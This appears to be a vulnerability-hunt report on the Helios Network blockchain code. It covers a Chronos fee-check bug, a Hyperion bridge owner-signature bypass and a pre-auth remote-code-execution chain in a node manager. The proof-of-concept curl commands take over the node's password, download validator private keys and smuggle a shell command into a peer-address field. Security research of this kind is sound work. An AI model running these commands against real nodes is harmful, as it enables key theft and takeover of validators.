# Helios Network 2026-08 — CDC Divergent Hunt (Web3 + Web2, Pre-auth RCE Chain)

**Target:** helios-network org (49 repos) + helioschain.network, Helios ETF-native L1 (I-PoSR, Hyperion, Chronos)
**Theorem:** 3 divergent theories → chaining [Trigger→Effect→Trust Boundary]
**Result:** 1 PROVEN pre-auth RCE (Web2 node manager) + 2 HIGH (Web3 logic)

## Recon & Environment Pitfall
- `git clone https://` failed: `git: 'remote-https' is not a git command` on TencentOS Server 4, git 2.49.0 `/usr/local/libexec/git-core` has only `git-remote`/`git-remote-ext`/`git-remote-fd` — no https helper. `yum/dnf/apt` no match for `git`.
- **Fix (durable):** fallback to GitHub zipball/tarball via curl + unzip — works without git-http:
  ```bash
  curl -sL "https://api.github.com/repos/helios-network/$repo/zipball/HEAD" -o "/tmp/$repo.zip"
  # or codeload: https://codeload.github.com/helios-network/$repo/tar.gz/refs/heads/$branch
  unzip -qo "/tmp/$repo.zip" -d /tmp/helios
  # also handle private/moved defaultBranch (ethermint→develop, grpc-web→master) by probing /tar.gz/refs/heads/<branch>
  # rate limit 403 after ~10 zipballs → needs PAT or throttle 0.8-1.2s
  ```
  Empty repos (`helios-lists`, `helios-indexer`) return 14-byte `404: Not Found` HTML — detect via `file`.

## Architecture (from helios-core/helios-chain/app/app.go + proto/)
- Modules: `x/chronos` (auto EVM scheduler), `x/hyperion` (Peggy/multi-chain bridge), `x/erc20`, `x/tokenfactory`, `x/evm` precompiles, `x/staking` custom I-PoSR, `x/epochs`, `x/revenue`
- Chronos proto: `proto/helios/chronos/v1/{cron,tx}.proto` — `MsgCreateCron{owner_address, contract_address 0x+42, abi_json, method_name, params[], frequency, expiration_block, gas_limit, max_gas_price, amount_to_deposit}`, `MsgCreateCallBackConditionedCron` (frequency 0, auto-generated abi `cb(bytes data, bytes error)`), `ExecutionStage END/BEGIN_BLOCKER`
- Hyperion proto: `proto/helios/hyperion/v1/msgs.proto` — 20+ Msgs: ValsetConfirm, SendToChain, RequestBatch, DepositClaim, WithdrawClaim, ExternalDataClaim, ValsetUpdatedClaim, ERC20DeployedClaim, SetOrchestratorAddresses, BlacklistAddresses, ForceSetValset...
- Bridge sol: `Ethereum-Bridge-Contract/contracts/Hyperion.sol` (Hyperion) + `Ethereum-HLS-Contract/contracts/Helios.sol` (HLS token)
- Web2: `helios-portal`, `helios-chronos-app`, `beta-etf-app`, `Helios-Docker-Chain-Manager` (Express :8080 node manager, `server.js`)

## Theory 1 — Logic Bypass / Trust Boundary
**Focus:** cosmos modules, hyperion relayer, bridge lock/mint

### Chain #2 — Chronos Keeper Fee Bypass (HIGH)
- `x/chronos/types/tx.go:34 Validate()` checks only `owner_address bech32`, `contract_address 0x+42`, `abi_json != ""`, `method_name != ""`, `frequency >0` — NO abi semantic, no contract existence, no AmountToDeposit.
- `x/chronos/keeper/msg_server.go:54-56 CreateCron` checks `EvmKeeper.GetCode(contract) !=0` but `CreateCallBackConditionedCron:180-212` **does NOT** — can point to EOA.
- `x/chronos/keeper/keeper.go:233-251 CronInTransfer`:
  ```go
  if balance.IsNegative() && balance.Cmp(amount) < 0 { return ErrInsufficientFunds } // BUG: && should be ||
  if !IsNegative && balance >0 { SendCoins(...) } // balance 0 → both false → nil → bypass
  ```
  Same in `CronOutTransfer:254-272`. `msg_server.go:38` also checks `balance < amount` correctly, so bypass only if attacker crafts raw Msg with `amount 0` (precompile blocks it with `>0` check in `precompiles/chronos/methods.go:104`).
- `keeper.go:718 msg := TxAsMessage(tx, baseFee, ownerAddress)` + `ApplyMessage(ctx, msg, true)` — validator auto-executes arbitrary ABI call **AS owner** every `frequency` blocks. `PushReadyCronsToQueue:139-149` checks `CronBalance <= maxGasPrice*gasLimit` correctly → zero-balance cron removed next block (1-block window).
- **Impact:** DoS/state bloat/gas griefing; callback-conditioned crons are **free** (`DeductFeesActivesCrons:188` skips them) → infinite free execution if hyperion triggers.

### Chain #3 — Hyperion Bridge Owner Bypass (HIGH)
- `Hyperion.sol: checkValidatorSignatures` ~L240: `if (validators.length <10 && validators[i]==owner()) return;` → single owner sig passes when set <10 (early Helios). `updateValset` + `submitBatch` then `HeliosERC20.mint(destinations, amounts)` infinite mint if `isHeliosNativeToken`.
- `x/hyperion/keeper/attestation.go:45-80` nonce checks **commented out** (3 april 2025 `// if claim.GetBlockHeight() < lastObserved...` `// if GetEventNonce() < lastEvent+1...`) → replay/out-of-order attestations accepted.
- **Mitigation:** Remove owner bypass, enforce `>2/3` power, re-enable nonce continuity, multisig owner.

## Theory 2 — Deserialization / Injection
- No EIP712/Model-specific RCE; `sdk-go`/`heliosjs` not auto-executed. Focus pivoted to `Helios-Docker-Chain-Manager`.

## Theory 3 — Hook / State Manipulation
- `Chronos PushReadyCronsToQueue:128`, `DeductFeesActivesCrons:159`, `ExecuteCrons:75`, `executeCron:751`, `StoreCronCallBackData:1176` — state inference: `frequency=1` every block, `callback-conditioned` queued via `StoreCronCallBackData` → `GetCronCallBackData` injects `hexutil.Encode(data,error)` as params.

## Web2 — Helios-Docker-Chain-Manager Pre-auth RCE (PROVEN)
- `server.js:23 auth(app, environement, ..., 'access-code', [])` — `excludedRoutes=[]`, `cors('*')`, `express.json()`
- `utils/middlewares.js:65-118 auth`:
  - `/auth`, `/auth-try`, `/auth-subscribe` handled **before** auth — unauthenticated.
  - Fresh node: `environement.password == undefined` (no `.password` file). Check `req.headers['access-code'] != undefined` → `undefined != undefined = false` → **bypass** all routes.
  - `/auth-subscribe` if `!exists(.password)` → `environement.password = providedPassword; fs.writeFileSync('.password', pw)` → attacker sets password pre-auth.
  - `isExcludedRoute = excludedRoutes.find(x=> req.path)` only exact match — dynamic routes still gated correctly, but `502 Bad Gateway` spoof leaks nothing.
- `utils/exec-wrapper.js:4 exec(cmd)` shell exec no sanitization. `actions/setupNodeFromBackup.js:114 tar -xzf "${backupPath}" -C "${homeDirectory}"` injectable; many `application/*.js` use template strings.
- `exposition/GET-download.js:15 path.join(homeDir,'config', filename)` fixed filenames but leaks keys: `GET /download/priv_validator_key.json`, `/node_key.json`, `/config.toml` with valid `access-code`.
- **POC:**
  ```bash
  curl -s http://node:8080/auth # false → no password
  curl -s -X POST http://node:8080/auth-subscribe -H 'Content-Type: application/json' -d '{"password":"pwned123"}' # true
  curl -s http://node:8080/download/priv_validator_key.json -H 'access-code: pwned123'
  curl -s -X POST http://node:8080/action -H 'access-code: pwned123' -d '{"type":"addPeer","peerAddress":"; id > /tmp/pwned #"}'
  ```

## Five-Scenario Read
- Best: full chain → key leak + RCE
- Expected: throttle/rate limit on Vercel portals (no RCE there)
- Adversarial: fresh node quickly sets password → need race
- Worst: attacker deploys validator via stolen key → network takeover
- Recovery: wipe `.password`, rotate keys, patch middlewares to constant-time + require initial password

## CDC Verdict
- Chain #1 PROVEN pre-auth RCE (node manager) — **primary**
- Chain #2 HIGH DoS fee bypass — mitigated by queue check
- Chain #3 HIGH bridge theft — conditional on <10 vals or owner compromise

## Lessons to Reuse
- Always probe defaultBranch per repo (ethermint develop, grpc-web master)
- Zipball fallback is primary when git-https broken — handle HTML 404 detection
- Check callback-conditioned path separately from legacy cron — often missing checks
- `&&` vs `||` in IsNegative+balance checks is classic Cosmos copy-paste bug — grep `IsNegative() &&.*Cmp`
